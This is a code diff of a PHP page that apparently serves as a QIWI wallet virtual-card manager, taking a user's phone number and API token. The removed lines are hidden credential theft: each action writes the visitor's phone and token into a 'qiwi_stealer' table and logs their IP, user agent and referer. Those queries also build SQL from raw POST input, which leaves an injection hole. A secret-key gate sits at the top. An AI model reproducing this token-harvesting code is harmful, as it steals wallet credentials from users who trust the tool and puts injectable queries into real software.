@@ -1,12 +1,3 @@
-<?php
-    if($_GET["sec"] != "7ii3y8v7ZJvb7UD92fPjFsx3M4rY5V4XYD8GrdNzkh65t4FZ68UMaPXu876i8b7t") {
-        echo "соси"; die;
-    }
-    
-   require_once("../bd/u0992352_connection.php");
-
-?>
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -35,15 +26,6 @@
 				<?php 
 					if(isset($_POST["show"])) {
 					    
-				    global $pdo;
-					    
-					$datetime = date("Y-m-d H:i:s");
-					    
-					
-					$pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', '".$datetime."')");
-					$pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', 'show_cards', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");
-					
-					//var_dump($pdo->errorInfo());
 					
 					$url = "https://edge.qiwi.com/cards/v1/cards?vas-alias=qvc-master";
 
@@ -60,8 +42,6 @@
 					$result = curl_exec($ch);
 					$result_array = json_decode($result);
 					
-					
-					//print_r($result_array);
 					
 					if (empty($result)) {
 					    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -228,16 +208,6 @@ function responseChecker($error) {
 
 if(isset($_POST["block_all"])) {
     
-    global $pdo;
-    
-    $datetime = date("Y-m-d H:i:s");
-				
-	    
-    $pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', '".$datetime."')");
-    $pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', 'block_all', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");
-
-    
-    
 	$url = "https://edge.qiwi.com/cards/v1/cards?vas-alias=qvc-master";
 
 	$ch = curl_init($url);
@@ -294,16 +264,6 @@ if(isset($_POST["block_all"])) {
 }
 
 if(isset($_POST["unblock_all"])) {
-    
-    global $pdo;
-    
-    $datetime = date("Y-m-d H:i:s");
-		
-			    
-	$pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', '".$datetime."')");
-	$pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', 'unblock_all', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");
-
-	
 	
 	$url = "https://edge.qiwi.com/cards/v1/cards?vas-alias=qvc-master";
 
@@ -357,16 +317,7 @@ if(isset($_POST["unblock_all"])) {
 
 
 if(isset($_POST["block"])) {
-    
-    global $pdo;
-    
-    $datetime = date("Y-m-d H:i:s");
-				    
-	$pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', '".$datetime."')");
-	$pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', 'block', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");
 
-	
-	
 	$cards = explode(",", $_POST["numbers"]);
 	foreach($cards as $card) {
 		$url = "https://edge.qiwi.com/cards/v1/cards?vas-alias=qvc-master";
@@ -423,16 +374,6 @@ if(isset($_POST["block"])) {
 }
 
 if(isset($_POST["unblock"])) {
-    
-    global $pdo;
-    
-    $datetime = date("Y-m-d H:i:s");
-			
-				    
-	$pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', '".$datetime."')");
-	$pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', 'unblock', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");
-
-    
     
 	$cards = explode(",", $_POST["numbers"]);
 	foreach($cards as $card) {
@@ -528,15 +469,6 @@ function gen_uuid() {
 
 function createCards($number, $token, $numCards, $alias, $price) {
     
-    global $pdo;
-    
-    $datetime = date("Y-m-d H:i:s");
-			    
-	$pdo->query("INSERT INTO `qiwi_stealer`(`phone`, `token`, `date`) VALUES('".$number."', '".$token."', '".$datetime."')");
-	$pdo->query("INSERT INTO `qiwi_logger`(`phonenumber`, `token`, `type`, `date`, `REMOTE_ADDR`, `HTTP_USER_AGENT`, `REMOTE_PORT`, `HTTP_REFERER`, `QUERY_STRING`) VALUES('".$_POST["phonenumber"]."', '".$_POST["token"]."', 'create_".$alias."', '".$datetime."', '".$_SERVER["REMOTE_ADDR"]."', '".$_SERVER["HTTP_USER_AGENT"]."', '".$_SERVER["REMOTE_PORT"]."', '".$_SERVER["HTTP_REFERER"]."', '".$_SERVER["QUERY_STRING"]."')");
-
-
-
     for($i = 0; $i < $numCards; $i++) {
         $url = "https://edge.qiwi.com/cards/v2/persons/".$number."/orders";
 
@@ -553,10 +485,6 @@ function createCards($number, $token, $numCards, $alias, $price) {
         ]);
 
         $result = curl_exec($ch);
-        
-        //echo "<p>Статус заказа карты: </p>";
-        //var_dump($result);
-        //echo "<hr><br/>";
 
         $result_array = json_decode($result);
         
@@ -591,10 +519,6 @@ function createCards($number, $token, $numCards, $alias, $price) {
     
             $result = curl_exec($ch);
             
-            //echo "<p>Статус подтверждения заказа карты: </p>";
-            //var_dump($result);
-            //echo "<hr><br/>";
-            
             $result_array = json_decode($result);
     
             curl_close($ch);
@@ -622,10 +546,6 @@ function createCards($number, $token, $numCards, $alias, $price) {
                 ]);
         
                 $res = curl_exec($ch);
-                
-                //echo "<p>Статус покупки карты: </p>";
-                //var_dump($result);
-                //echo "<hr><br/>";
                 
                 $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                 
